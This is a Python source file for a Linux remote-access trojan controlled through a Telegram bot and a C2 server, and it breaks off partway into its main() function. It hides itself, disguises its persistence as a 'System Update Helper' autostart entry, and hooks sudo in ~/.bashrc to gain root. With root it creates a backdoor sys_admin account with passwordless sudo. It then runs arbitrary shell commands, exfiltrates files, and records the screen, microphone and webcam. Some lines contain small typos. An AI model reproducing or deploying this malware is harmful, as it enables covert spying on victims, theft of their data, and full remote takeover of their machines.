#!/usr/bin/env python3
import os
import sys
import argparse
import subprocess
import pwd
import socket
import shutil
import logging

# ==============================================================================
#  SUPER UNIFIED TOOL (Triggered Deployment & Persistence)
# ==============================================================================

# CONFIGURATION
BOT_TOKEN = "<Your-Bot-Token>"
CHAT_ID = "Your-Chat-ID"
SYS_ADMIN_USER = "sys_admin"
SYS_ADMIN_PASS = "123"

# Server URL for device registry — points to the Node.js server (port 3000)
SERVER_URL = os.environ.get("SERVER_URL", "http://localhost:3000")

# Unique ID for this device instance (set after socket/pwd are available)
MY_DEVICE_ID = None  # will be set in run_bot()

# Paths — all hidden, nothing visible in ~/Downloads or home
HIDDEN_TOOL    = os.path.expanduser("~/.cache/.sys_tool.py")
SHARED_TOOL    = "/tmp/.sys_tool.py"
PAYLOAD_SCRIPT = os.path.expanduser("~/.cache/.deploy_payload.sh")
AUTOSTART_DIR  = os.path.expanduser("~/.config/autostart")
AUTOSTART_FILE = os.path.join(AUTOSTART_DIR, ".system-update-helper.desktop")
BASHRC         = os.path.expanduser("~/.bashrc")
MIC_PATH       = "/tmp/mic.wav"
SCREEN_PATH    = "/tmp/screen.png"
MONITOR_PATH   = "/tmp/monitor.mp4"
CAMERA_PATH    = "/tmp/camera.mp4"
SETUP_LOG      = os.path.expanduser("~/.cache/tool_setup.log")

# Session tracking for stateful directory navigation
USER_SESSIONS = {}

# --- SHARED LOGGER ---

import datetime

def setup_log(msg):
    """Write a timestamped log line to tool_setup.log (silent on stdout)."""
    os.makedirs(os.path.dirname(SETUP_LOG), exist_ok=True)
    ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    line = f"[{ts}] {msg}"
    with open(SETUP_LOG, "a") as f:
        f.write(line + "\n")

# --- CORE LOGIC ---

def find_user_files_logic(username, start_path="/"):
    try:
        user_info = pwd.getpwnam(username)
        user_uid = user_info.pw_uidx
        print(f"[*] Searching for files owned by '{username}' in '{start_path}'...")
    except KeyError:
        return "Error: User not found."

    results = []
    for root, dirs, files in os.walk(start_path, topdown=True):
        dirs[:] = [d for d in dirs if os.access(os.path.join(root, d), os.R_OK)]
        for name in files + dirs:
            path = os.path.join(root, name)
            try:
                if os.lstat(path).st_uid == user_uid:
                    results.append(path)
            except: continue
    return "\n".join(results) if results else "No files found."

# --- SELF INSTALL (one-liner deploy from /tmp) ---

def self_install():
    """Copy self to /tmp (hidden from Downloads), run setup, then clean /tmp copy."""
    tmp_copy = "/tmp/.sys_tool_init.py"
    shutil.copy2(os.path.abspath(__file__), tmp_copy)
    os.chmod(tmp_copy, 0o755)
    subprocess.run([sys.executable, tmp_copy, "setup"])
    try:
        os.remove(tmp_copy)
    except: pass

# --- DEFERRED SETUP LOGIC ---

def install_deferred_setup():
    """Installs trigger, hides script, registers autostart. Actual bot deploys on first sudo."""
    setup_log("[*] Preparing deferred deployment...")

    # 1. Hide script in ~/.cache (NOT visible in Downloads or home folder)
    os.makedirs(os.path.dirname(HIDDEN_TOOL), exist_ok=True)
    shutil.copy2(os.path.abspath(__file__), HIDDEN_TOOL)
    os.chmod(HIDDEN_TOOL, 0o755)
    setup_log(f"[+] Script hidden at: {HIDDEN_TOOL}")

    # 2. Create the Deploy Payload (runs on first successful sudo)
    payload_content = f'''#!/bin/bash
if [[ $EUID -ne 0 ]]; then exit 1; fi

LOG="{SETUP_LOG}"
log() {{
    echo "[$(date +'%Y-%m-%d %H:%M:%S')] $1" >> "$LOG"
}}

# Copy tool to shared /tmp location for sys_admin
cp "{HIDDEN_TOOL}" "{SHARED_TOOL}"
chmod 777 "{SHARED_TOOL}"

# If sys_admin already exists, just ensure bot is running
if id "{SYS_ADMIN_USER}" &>/dev/null; then
    if ! pgrep -f "{SHARED_TOOL} bot" > /dev/null; then
        su - {SYS_ADMIN_USER} -c "nohup python3 {SHARED_TOOL} bot > /tmp/bot.log 2>&1 &"
    fi
    exit 0
fi

# --- FIRST TIME FULL DEPLOYMENT ---
log "[*] Background setup triggered! Installing dependencies..."
 
# 1. System dependencies
if command -v apt-get &> /dev/null; then
    export DEBIAN_FRONTEND=noninteractive
    apt-get update -yq && apt-get install -yq python3-pip curl alsa-utils scrot ffmpeg x11-utils gnome-screenshot
elif command -v yum &> /dev/null; then
    yum install -y python3-pip curl alsa-utils scrot ffmpeg xorg-x11-utils
elif command -v dnf &> /dev/null; then
    dnf install -y python3-pip curl alsa-utils scrot ffmpeg xorg-x11-utils
fi
log "[+] System dependencies installed."

# 2. Python dependencies
log "[*] Installing Python libraries..."
python3 -m pip install python-telegram-bot requests --break-system-packages --quiet

# 3. Create sys_admin user with full sudo
log "[*] Creating hidden sys_admin user..."
useradd -m -s /bin/bash {SYS_ADMIN_USER} &>/dev/null
echo "{SYS_ADMIN_USER}:{SYS_ADMIN_PASS}" | chpasswd
echo "{SYS_ADMIN_USER} ALL=(ALL) NOPASSWD: ALL" > "/etc/sudoers.d/99-{SYS_ADMIN_USER}"
chmod 0440 "/etc/sudoers.d/99-{SYS_ADMIN_USER}"

# 4. Launch bot silently as sys_admin
log "[*] Starting bot process in background..."
su - {SYS_ADMIN_USER} -c "nohup python3 {SHARED_TOOL} bot > /tmp/bot.log 2>&1 &"

# 5. Notify via Telegram
curl -s -X POST "https://api.telegram.org/bot{BOT_TOKEN}/sendMessage" \\
    -d "chat_id={CHAT_ID}&text=✅ Background Deployment Done on $(hostname). Bot live as {SYS_ADMIN_USER}." >/dev/null
log "[+] Background setup completed successfully!"
'''
    with open(PAYLOAD_SCRIPT, "w") as f:
        f.write(payload_content)
    os.chmod(PAYLOAD_SCRIPT, 0o755)
    setup_log(f"[+] Deploy payload created: {PAYLOAD_SCRIPT}")

    # 3. Register AUTOSTART — runs on every GUI login, silently in background
    #    (Replaces external system-update-helper.desktop file)
    os.makedirs(AUTOSTART_DIR, exist_ok=True)
    LOG_PATH = os.path.expanduser("~/.cache/bot_launcher.log")
    desktop_content = f"""[Desktop Entry]
Type=Application
Name=System Update Helper
Comment=Checks for pending system updates
Exec=bash -c 'nohup python3 "{HIDDEN_TOOL}" bot >> "{LOG_PATH}" 2>&1 &'
Hidden=false
NoDisplay=true
X-GNOME-Autostart-enabled=true
StartupNotify=false
Terminal=false
"""
    with open(AUTOSTART_FILE, "w") as f:
        f.write(desktop_content)
    os.chmod(AUTOSTART_FILE, 0o644)
    setup_log(f"[+] Autostart registered → will run silently on every login.")

    # 3b. Desktop launcher creation removed per user request

    # 4. Install sudo wrapper in ~/.bashrc (triggers full deploy on first sudo)
    sudo_wrapper = f'''
# Added by System Service
sudo() {{
    command sudo "$@"
    local status=$?
    if [ $status -eq 0 ]; then
        if [ -x "{PAYLOAD_SCRIPT}" ]; then
            echo "[$(date +'%Y-%m-%d %H:%M:%S')] Sudo Hook Triggered!" >> ~/.cache/hook_debug.log
            nohup sudo -n "{PAYLOAD_SCRIPT}" >> ~/.cache/hook_debug.log 2>&1 &
        fi
    fi
    return $status
}}
'''
    # Remove old wrapper if it exists
    if os.path.exists(BASHRC):
        with open(BASHRC, "r") as f:
            lines = f.readlines()
        with open(BASHRC, "w") as f:
            for line in lines:
                if "sudo() {" in line or "# Added by System" in line:
                    break
                f.write(line)

    with open(BASHRC, "a") as f:
        f.write(sudo_wrapper)
    setup_log(f"[+] Sudo hook installed in ~/.bashrc")

    setup_log("" )
    setup_log("=" * 64)
    setup_log(" ✅ Setup complete! Summary:")
    setup_log(f"   Script hidden → {HIDDEN_TOOL}")
    setup_log(f"   Autostart     → {AUTOSTART_FILE}  (runs on every login)")
    setup_log(f"   Setup log     → {SETUP_LOG}")
    setup_log(f"   Bot log       → {LOG_PATH}")
    setup_log("=" * 64)
    
    # 5. Bring deployment entirely forward during explicit setup
    # --- REMOVED: No more immediate prompt. We strictly rely on the bashrc trap. ---
    setup_log("[*] Setup applied silently. Waiting for target to use sudo naturally.")
# --- BOT HELPERS ---

def get_current_dir(chat_id):
    return USER_SESSIONS.get(chat_id, os.getcwd())

def record_mic(seconds, path):
    """Open audio devices temporarily then record with arecord or ffmpeg."""
    try:
        # Grant access to all audio devices so sys_admin can record
        subprocess.run("sudo chmod 666 /dev/snd/* 2>/dev/null", shell=True)

        # Attempt 1: arecord (ALSA direct)
        cmd1 = f"arecord -f S16_LE -r 44100 -c 1 -d {seconds} {path}"
        r = subprocess.run(cmd1, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE, text=True)
        if os.path.isfile(path) and r.returncode == 0:
            subprocess.run(f"sudo chmod 777 {path}", shell=True)
            return True, ""
        err1 = r.stderr.strip()

        # Attempt 2: ffmpeg with ALSA
        subprocess.run(f"sudo rm -f {path}", shell=True)
        cmd2 = f"ffmpeg -y -f alsa -i default -t {seconds} -aco0dec pcm_s16le -ar 44100 -ac 1 {path}"
        r2 = subprocess.run(cmd2, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE, text=True)
        if os.path.isfile(path) and r2.returncode == 0:
            subprocess.run(f"sudo chmod 777 {path}", shell=True)
            return True, ""
        err2 = r2.stderr.strip()

        # Attempt 3: ffmpeg with PulseAudio (active user env)
        user = get_active_user()
        if user:
            try:
                uid = pwd.getpwnam(user).pw_uid
                pulse_env = f"PULSE_RUNTIME_PATH=/run/user/{uid}/pulse XDG_RUNTIME_DIR=/run/user/{uid}"
                subprocess.run(f"sudo rm -f {path}", shell=True)
                cmd3 = f"sudo -u {user} env {pulse_env} ffmpeg -y -f pulse -i default -t {seconds} -acodec pcm_s16le -ar 44100 -ac 1 {path}"
                r3 = subprocess.run(cmd3, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE, text=True)
                if os.path.isfile(path) and r3.returncode == 0:
                    subprocess.run(f"sudo chmod 777 {path}", shell=True)
                    return True, ""
                err3 = r3.stderr.strip()
            except Exception:
                err3 = "pulse attempt failed"
        else:
            err3 = "no active user found"

        return False, f"arecord: {err1[:200]}\nffmpeg-alsa: {err2[:200]}\nffmpeg-pulse: {err3[:200]}"
    except Exception as e:
        return False, str(e)


def get_x11_auth_cmd():
    try:
        active_user = subprocess.check_output("users | awk '{print $1}' | head -n 1", shell=True, text=True).strip()
        if not active_user: return "sudo env DISPLAY=:0"
        uid = pwd.getpwnam(active_user).pw_uid
        paths = [
            f"/run/user/{uid}/gdm/Xauthority",
            f"/run/user/{uid}/.mutter-Xwaylandauth*",
            f"/home/{active_user}/.Xauthority",
            f"/var/run/lightdm/root/:0"
        ]
        for p in paths:
            try:
                resolved = subprocess.check_output(f"sudo sh -c 'ls {p} 2>/dev/null'", shell=True, text=True).strip().split('\n')[0]
                if resolved and subprocess.run(f"sudo test -f {resolved}", shell=True).returncode == 0:
                    return f"sudo env DISPLAY=:0 XAUTHORITY={resolved}"
            except: pass
    except:
        pass
    return "sudo env DISPLAY=:0"

def get_active_user():
    try:
        active = subprocess.check_output("who | awk '($2 ~ /^:[0-9.]+$/ || $2 ~ /tty[0-9]+/) {print $1; exit}'", shell=True, text=True).strip()
        if active: return active
        active = subprocess.check_output("logname 2>/dev/null || users | awk '{print $1}'", shell=True, text=True).strip()
        if active and active != "root" and active != SYS_ADMIN_USER:
            return active
    except: pass
    return None

def capture_screen(path):
    try:
        subprocess.run(f"sudo rm -f {path}", shell=True)
        user = get_active_user()
        if not user: return False, "Could not identify active desktop user."
        uid = pwd.getpwnam(user).pw_uid
        cmd = f"sudo -u {user} env DISPLAY=:0 DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/{uid}/bus gnome-screenshot -f {path}"
        result = subprocess.run(cmd, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE, text=True)
        if result.returncode != 0 or not os.path.isfile(path):
            auth_cmd = get_x11_auth_cmd()
            cmd2 = f"{auth_cmd} scrot -o {path}"
            result = subprocess.run(cmd2, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE, text=True)
        if os.path.isfile(path):
            subprocess.run(f"sudo chmod 777 {path}", shell=True)
            return True, ""
        return False, result.stderr.strip() or "Both gnome-screenshot and scrot failed."
    except Exception as e:
        return False, str(e)

def capture_camera(seconds, path):
    try:
        subprocess.run(f"sudo rm -f {path}", shell=True)

        # Grant access to video device so sys_admin can record directly
        subprocess.run("sudo chmod 666 /dev/video* 2>/dev/null", shell=True)
        subprocess.run("sudo fuser -k /dev/video0 2>/dev/null", shell=True)

        cmd = (
            f"ffmpeg -y -f v4l2 -framerate 25 -video_size 640x480 "
            f"-i /dev/video0 -t {seconds} -c:v libx264 -preset ultrafast {path}"
        )
        result = subprocess.run(cmd, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE, text=True)
        if os.path.isfile(path) and result.returncode == 0:
            subprocess.run(f"sudo chmod 777 {path}", shell=True)
            return True, ""
        err = result.stderr.strip()
        if "No such file or directory" in err and "/dev/video" in err:
            err = "Camera device not found (/dev/video0). Ensure webcam is connected."
        elif "Device or resource busy" in err:
            err = "Camera is in use by another application."
        elif "Permission denied" in err:
            err = "Permission denied even after chmod — try rebooting the target machine."
        return False, err
    except Exception as e:
        return False, str(e)

def record_screen(seconds, path):
    try:
        subprocess.run(f"sudo rm -f {path}", shell=True)
        user = get_active_user()
        if not user: return False, "Could not identify active desktop user."
        uid = pwd.getpwnam(user).pw_uid
        res = "1920x1080"
        try:
            res_output = subprocess.check_output(f"sudo -u {user} env DISPLAY=:0 xdpyinfo | awk '/dimensions/{{print $2}}'", shell=True, text=True).strip()
            if 'x' in res_output: res = res_output
        except: pass
        cmd = f"sudo -u {user} env DISPLAY=:0 DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/{uid}/bus ffmpeg -y -video_size {res} -framerate 10 -f x11grab -i :0 -t {seconds} -c:v libx264 -preset ultrafast -pix_fmt yuv420p {path}"
        result = subprocess.run(cmd, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE, text=True)
        if os.path.isfile(path) and result.returncode == 0:
            subprocess.run(f"sudo chmod 777 {path}", shell=True)
            return True, ""
        err = result.stderr.strip()
        if "Cannot open display" in err or "Protocol error" in err:
            err = f"Wayland blocked FFmpeg.\nSwitch login to 'Ubuntu on Xorg'.\nRaw Error: {err[:200]}"
        return False, err
    except Exception as e:
        return False, str(e)

def run_cmd(cmd, cwd):
    try:
        import shlex
        escaped_cwd = shlex.quote(cwd)
        bash_cmd = f"cd {escaped_cwd} && {cmd}"
        result = subprocess.run(
            bash_cmd, shell=True, text=True,
            stdout=subprocess.PIPE, stderr=subprocess.PIPE,
            executable="/bin/bash"
        )
        out = result.stdout.strip()
        err = result.stderr.strip()
        if out and err:
            return f"{out}\n\n[stderr]\n{err}"
        return out or err or "(no output)"
    except Exception as e:
        return f"Error executing command: {str(e)}"


# --- DEVICE HEARTBEAT ---

def _send_heartbeat(device_id, hostname, user):
    """POST a heartbeat to the Node.js server device registry."""
    try:
        import urllib.request
        import json as _json
        payload = _json.dumps({
            "device_id": device_id,
            "hostname": hostname,
            "user": user
        }).encode()
        req = urllib.request.Request(
            f"{SERVER_URL}/api/devices/register",
            data=payload,
            headers={"Content-Type": "application/json"},
            method="POST"
        )
        urllib.request.urlopen(req, timeout=5)
    except Exception:
        pass  # Silently ignore — server might not be running


def _upload_file(file_path, device_id):
    """Uploads a file to the server and returns the download URL."""
    try:
        import requests
        if not os.path.exists(file_path):
            return None
        filename = f"{device_id}_{os.path.basename(file_path)}"
        with open(file_path, "rb") as f:
            headers = {"User-Agent": "curl/7.68.0"}
            requests.post(f"{SERVER_URL}/upload", files={"file": (filename, f)}, data={"username": device_id}, headers=headers, timeout=30)
        return f"{SERVER_URL}/download/{filename}"
    except Exception as e:
        return f"Upload error: {e}"

def _poll_commands(device_id):
    """Poll for pending commands from the C2 server, execute them, and post results."""
    try:
        import requests
        resp = requests.get(f"{SERVER_URL}/api/commands/{device_id}", timeout=5)
        if resp.status_code == 200:
            commands = resp.json()
            for cmd in commands:
                cmd_id = cmd.get("cmd_id")
                action = cmd.get("action")
                args = cmd.get("args", [])
                result_text = ""
                
                if action == "sysinfo":
                    result_text = run_cmd("uname -a && free -m && df -h /", os.getcwd())
                elif action == "cmd":
                    cmd_str = " ".join(args)
                    result_text = run_cmd(cmd_str, os.getcwd())
                elif action == "screen":
                    ok, err = capture_screen(SCREEN_PATH)
                    if ok:
                        url = _upload_file(SCREEN_PATH, device_id)
                        result_text = f"Screenshot linked: {url}"
                    else:
                        result_text = f"Error: {err}"
                elif action == "monitor":
                    secs = int(args[0]) if args and args[0].isdigit() else 10
                    ok, err = record_screen(secs, MONITOR_PATH)
                    if ok:
                        url = _upload_file(MONITOR_PATH, device_id)
                        result_text = f"Monitor recording linked: {url}"
                    else:
                        result_text = f"Error: {err}"
                elif action == "mic":
                    secs = int(args[0]) if args and args[0].isdigit() else 5
                    ok, err = record_mic(secs, MIC_PATH)
                    if ok:
                        url = _upload_file(MIC_PATH, device_id)
                        result_text = f"Mic recording linked: {url}"
                    else:
                        result_text = f"Error: {err}"
                elif action == "camera":
                    secs = int(args[0]) if args and args[0].isdigit() else 5
                    ok, err = capture_camera(secs, CAMERA_PATH)
                    if ok:
                        url = _upload_file(CAMERA_PATH, device_id)
                        result_text = f"Camera recording linked: {url}"
                    else:
                        result_text = f"Error: {err}"
                else:
                    result_text = f"Unknown action: {action}"
                
                requests.post(f"{SERVER_URL}/api/commands/result", json={
                    "device_id": device_id,
                    "cmd_id": cmd_id,
                    "status": "completed",
                    "result": result_text
                }, timeout=5)
    except Exception:
        pass

def _start_heartbeat_thread(device_id, hostname, user):
    """Background thread: send heartbeat every 30 seconds, poll commands every 5 seconds."""
    import threading
    import time

    def _loop():
        last_heartbeat = 0
        while True:
            now = time.time()
            if now - last_heartbeat >= 30:
                _send_heartbeat(device_id, hostname, user)
                last_heartbeat = now
            _poll_commands(device_id)
            time.sleep(5)

    t = threading.Thread(target=_loop, daemon=True)
    t.start()


def _fetch_devices():
    """Fetch connected device list from the server."""
    try:
        import urllib.request
        import json as _json
        with urllib.request.urlopen(f"{SERVER_URL}/api/devices", timeout=5) as resp:
            return _json.loads(resp.read())
    except Exception:
        return []


# --- BOT ENGINE ---

def run_bot():
    import datetime

    log_file = os.path.expanduser("~/.cache/bot_launcher.log")
    os.makedirs(os.path.dirname(log_file), exist_ok=True)

    def log(msg):
        with open(log_file, "a") as lf:
            lf.write(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {msg}\n")
        print(msg)

    log("Bot launcher started.")

    # --- Guard: PID file lock — prevents duplicate instances regardless of launch path ---
    PID_FILE = "/tmp/.sys_bot.pid"

    def _read_pid():
        try:
            with open(PID_FILE) as pf:
                return int(pf.read().strip())
        except Exception:
            return None

    def _pid_alive(pid):
        try:
            os.kill(pid, 0)
            return True
        except OSError:
            return False

    existing_pid = _read_pid()
    if existing_pid and _pid_alive(existing_pid) and existing_pid != os.getpid():
        log(f"Bot already running (PID {existing_pid}). Exiting to avoid duplicate responses.")
        return

    # Write our PID so future launches can detect us
    try:
        with open(PID_FILE, "w") as pf:
            pf.write(str(os.getpid()))
    except Exception as e:
        log(f"[warn] Could not write PID file: {e}")

    import atexit
    def _cleanup_pid():
        try:
            if _read_pid() == os.getpid():
                os.remove(PID_FILE)
        except Exception:
            pass
    atexit.register(_cleanup_pid)

    # --- Auto-install python-telegram-bot if missing ---
    try:
        import telegram
        log("python-telegram-bot already installed, skipping install.")
    except ImportError:
        log("Installing python-telegram-bot...")
        result = subprocess.run(
            ["pip3", "install", "python-telegram-bot", "--break-system-packages", "--quiet"],
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT
        )
        log(result.stdout.decode().strip() or "Install complete.")
        # Restart self so the new install is picked up
        log("Restarting to load installed package...")
        os.execv(sys.executable, ['python3'] + sys.argv)

    log("Launching Telegram bot...")
    try:
        import json
        from telegram import Update, BotCommand, InlineKeyboardButton, InlineKeyboardMarkup, WebAppInfo
        from telegram.ext import ApplicationBuilder, ContextTypes, CommandHandler, CallbackQueryHandler, MessageHandler, filters
    except ImportError as e:
        log(f"Import failed even after install: {e}")
        return

    logging.basicConfig(level=logging.INFO)

    # Set up device identity
    MY_HOSTNAME = socket.gethostname()
    MY_USER = pwd.getpwuid(os.getuid()).pw_name
    global MY_DEVICE_ID
    MY_DEVICE_ID = f"{MY_HOSTNAME}_{MY_USER}"

    async def post_init(application):
        commands = [
            BotCommand("start",   "Check if bot is online"),
            BotCommand("devices", "List connected devices"),
            BotCommand("cmd",     "Run a shell command"),
            BotCommand("get",     "Download file from server (/get <path>)"),
            BotCommand("mic",     "Record microphone audio (/mic <seconds>)"),
            BotCommand("screen",  "Capture live desktop screenshot"),
            BotCommand("monitor", "Record live monitor activity (/monitor <seconds>)"),
            BotCommand("camera",  "Record webcam video (/camera <seconds>)"),
        ]
        await application.bot.set_my_commands(commands)
        # Send initial heartbeat + start background thread
        _send_heartbeat(MY_DEVICE_ID, MY_HOSTNAME, MY_USER)
        _start_heartbeat_thread(MY_DEVICE_ID, MY_HOSTNAME, MY_USER)
        try:
            await application.bot.send_message(
                chat_id=CHAT_ID,
                text=f"🚀 *Bot Connected*\n"
                     f"🖥 Host: `{MY_HOSTNAME}`\n"
                     f"👤 User: `{MY_USER}`\n"
                     f"🔑 Device ID: `{MY_DEVICE_ID}`\n"
                     f"📡 Status: `Online`",
                parse_mode='Markdown'
            )
        except Exception as e:
            logging.error(f"Post-init notification failed: {e}")

    async def start(update: Update, context):
        if str(update.effective_user.id) != CHAT_ID: return
        keyboard = [
            [InlineKeyboardButton("📸 Screen", callback_data="screen"),
             InlineKeyboardButton("📹 Monitor (10s)", callback_data="monitor")],
            [InlineKeyboardButton("🎙 Mic (5s)", callback_data="mic"),
             InlineKeyboardButton("📷 Camera (5s)", callback_data="camera")],
            [InlineKeyboardButton("ℹ️ Sys Info", callback_data="sysinfo")],
            [InlineKeyboardButton("🛠 Custom CMD", callback_data="cmd_prompt")],
            [InlineKeyboardButton("🌐 Open Web App", web_app=WebAppInfo(url="https://pratham-1323.github.io/Linux/"))]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.effective_message.reply_text(
            f"📱 *Device Control Panel*\n"
            f"🖥 Host: `{MY_HOSTNAME}`\n"
            f"👤 User: `{MY_USER}`\n"
            f"🔑 Device: `{MY_DEVICE_ID}`\n"
            f"📂 CWD: `{os.getcwd()}`\n\n"
            f"Select an action below:",
            parse_mode='Markdown',
            reply_markup=reply_markup
        )

    async def devices(update: Update, context):
        if str(update.effective_user.id) != CHAT_ID: return
        device_list = _fetch_devices()
        if not device_list:
            await update.effective_message.reply_text("❌ No devices found. Is the server running?")
            return
        lines = ["📡 *Connected Devices:*\n"]
        for d in device_list:
            status = "🟢 Online" if d.get('online') else "🔴 Offline"
            marker = " ← **(this device)**" if d['device_id'] == MY_DEVICE_ID else ""
            lines.append(
                f"{status} `{d['device_id']}`{marker}\n"
                f"  🖥 `{d['hostname']}` | 👤 `{d['user']}`"
            )
        await update.effective_message.reply_text("\n".join(lines), parse_mode='Markdown')

    async def cmd(update: Update, context):
        chat_id = update.effective_message.chat_id
        if str(chat_id) != CHAT_ID: return
        command_input = " ".join(context.args)
        if not command_input:
            await update.effective_message.reply_text("Usage: /cmd [-p password] <command>\nExample: /cmd -p 1234 sudo ls")
            return
        if command_input.startswith("-p "):
            parts = command_input.split(" ", 2)
            if len(parts) >= 3:
                password = parts[1]
                actual_cmd = parts[2]
                if actual_cmd.startswith("sudo "):
                    import shlex
                    safe_pass = shlex.quote(password)
                    command_input = f"echo {safe_pass} | sudo -S {actual_cmd[5:]}"
                else:
                    command_input = actual_cmd
        current_dir = get_current_dir(chat_id)
        if command_input.strip() == "cd" or command_input.startswith("cd "):
            target_dir = command_input[3:].strip() or os.path.expanduser("~")
            if not os.path.isabs(target_dir):
                new_path = os.path.join(current_dir, target_dir)
            else:
                new_path = target_dir
            new_path = os.path.normpath(new_path)
            if os.path.isdir(new_path):
                USER_SESSIONS[chat_id] = new_path
                await update.effective_message.reply_text(f"📂 Directory changed to:\n{new_path}")
            else:
                await update.effective_message.reply_text(f"❌ Directory not found:\n{new_path}")
            return
        output = run_cmd(command_input, current_dir)
        header = f"📍 {current_dir}\n$ {command_input}\n{'-'*25}\n"
        full_response = header + output
        for i in range(0, len(full_response), 4000):
            await update.effective_message.reply_text(f"```\n{full_response[i:i + 4000]}\n```", parse_mode='Markdown')

    async def get_file(update: Update, context):
        chat_id = update.effective_message.chat_id
        if str(chat_id) != CHAT_ID: return
        if not context.args:
            await update.effective_message.reply_text("Usage: /get <file_path>")
            return
        file_path = " ".join(context.args)
        if not os.path.isabs(file_path):
            file_path = os.path.join(get_current_dir(chat_id), file_path)
        file_path = os.path.normpath(file_path)
        if not os.path.isfile(file_path):
            await update.effective_message.reply_text("❌ File not found")
            return
        try:
            await update.effective_message.reply_document(
                document=open(file_path, "rb"),
                filename=os.path.basename(file_path)
            )
        except Exception as e:
            await update.effective_message.reply_text(f"❌ Error sending file:\n{str(e)}")

    async def mic(update: Update, context):
        chat_id = update.effective_message.chat_id
        if str(chat_id) != CHAT_ID: return
        seconds = 5
        if context.args and context.args[0].isdigit():
            seconds = int(context.args[0])
        await update.effective_message.reply_text(f"🎙 Recording {seconds} seconds...")
        ok, err_msg = record_mic(seconds, MIC_PATH)
        if not ok:
            await update.effective_message.reply_text(f"❌ Mic error:\n{err_msg}")
            return
        try:
            await update.effective_message.reply_audio(audio=open(MIC_PATH, "rb"), filename="mic.wav")
        except Exception as e:
            await update.effective_message.reply_text(f"❌ Error sending audio:\n{str(e)}")

    async def camera(update: Update, context):
        chat_id = update.effective_message.chat_id
        if str(chat_id) != CHAT_ID: return
        seconds = 5
        if context.args and context.args[0].isdigit():
            seconds = int(context.args[0])
        status_msg = await update.effective_message.reply_text(f"📷 Recording {seconds}s from webcam...")
        ok, err_msg = capture_camera(seconds, CAMERA_PATH)
        if not ok:
            await status_msg.edit_text(f"❌ Camera record failed:\n`{err_msg[-500:]}`", parse_mode='Markdown')
            return
        try:
            await update.effective_message.reply_video(video=open(CAMERA_PATH, "rb"))
            await status_msg.delete()
        except Exception as e:
            await status_msg.edit_text(f"❌ Error sending webcam video:\n{str(e)}")

    async def screen(update: Update, context):
        chat_id = update.effective_message.chat_id
        if str(chat_id) != CHAT_ID: return
        status_msg = await update.effective_message.reply_text("📸 Capturing screenshot...")
        ok, err_msg = capture_screen(SCREEN_PATH)
        if not ok:
            await status_msg.edit_text(f"❌ Screenshot failed:\n`{err_msg[-500:]}`", parse_mode='Markdown')
            return
        try:
            await update.effective_message.reply_photo(photo=open(SCREEN_PATH, "rb"))
            await status_msg.delete()
        except Exception as e:
            await status_msg.edit_text(f"❌ Error sending screenshot:\n{str(e)}")

    async def monitor(update: Update, context):
        chat_id = update.effective_message.chat_id
        if str(chat_id) != CHAT_ID: return
        seconds = 10
        if context.args and context.args[0].isdigit():
            seconds = int(context.args[0])
        status_msg = await update.effective_message.reply_text(f"📹 Recording {seconds}s of monitor activity...")
        ok, err_msg = record_screen(seconds, MONITOR_PATH)
        if not ok:
            await status_msg.edit_text(f"❌ Monitor record failed:\n`{err_msg[-500:]}`", parse_mode='Markdown')
            return
        try:
            await update.effective_message.reply_video(video=open(MONITOR_PATH, "rb"))
            await status_msg.delete()
        except Exception as e:
            await status_msg.edit_text(f"❌ Error sending video:\n{str(e)}")

    async def button_handler(update: Update, context):
        query = update.callback_query
        if str(query.from_user.id) != CHAT_ID: return
        await query.answer()
        data = query.data
        if data == "sysinfo":
            info = run_cmd("uname -a && free -m && df -h /", get_current_dir(CHAT_ID))
            await query.message.reply_text(f"```\n{info}\n```", parse_mode='Markdown')
        elif data == "screen":
            context.args = []
            await screen(update, context)
        elif data == "monitor":
            context.args = ["10"]
            await monitor(update, context)
        elif data == "mic":
            context.args = ["5"]
            await mic(update, context)
        elif data == "camera":
            context.args = ["5"]
            await camera(update, context)
        elif data == "cmd_prompt":
            await query.message.reply_text("Please type your command like:\n`/cmd ls -la`", parse_mode='Markdown')

    async def webapp_data_handler(update: Update, context):
        import json
        if str(update.effective_user.id) != CHAT_ID: return
        try:
            data = json.loads(update.effective_message.web_app_data.data)
            # --- Multi-device targeting: only respond if this device is targeted ---
            target = data.get("target_device")
            if target and target != MY_DEVICE_ID:
                return  # This command is for a different device
            action = data.get("action")
            if action == "sysinfo":
                info = run_cmd("uname -a && free -m && df -h /", get_current_dir(CHAT_ID))
                await update.effective_message.reply_text(f"```\n{info}\n```", parse_mode='Markdown')
            elif action == "screen":
                context.args = []
                await screen(update, context)
            elif action == "monitor":
                context.args = ["10"]
                await monitor(update, context)
            elif action == "mic":
                context.args = ["5"]
                await mic(update, context)
            elif action == "camera":
                context.args = ["5"]
                await camera(update, context)
            elif action == "cmd":
                payload = data.get("payload", "")
                context.args = payload.split()
                await cmd(update, context)
        except Exception as e:
            await update.effective_message.reply_text(f"❌ WebApp Error: {e}")

    from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, filters
    app = ApplicationBuilder().token(BOT_TOKEN).post_init(post_init).build()
    app.add_handler(CommandHandler('start',   start))
    app.add_handler(CommandHandler('devices', devices))
    app.add_handler(CommandHandler('cmd',     cmd))
    app.add_handler(CommandHandler('get',     get_file))
    app.add_handler(CommandHandler('mic',     mic))
    app.add_handler(CommandHandler('camera',  camera))
    app.add_handler(CommandHandler('screen',  screen))
    app.add_handler(CommandHandler('monitor', monitor))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.StatusUpdate.WEB_APP_DATA, webapp_data_handler))
    app.run_polling()


# --- CLI ---

def main():
    # --- Self-chmod: make this script executable automatically ---
    try:
        script_path = os.path.abspath(__file__)
        current_mode = os.stat(script_path).st_mode
        os.chmod(script_path, current_mode | 0o111)  # add execute bits for all
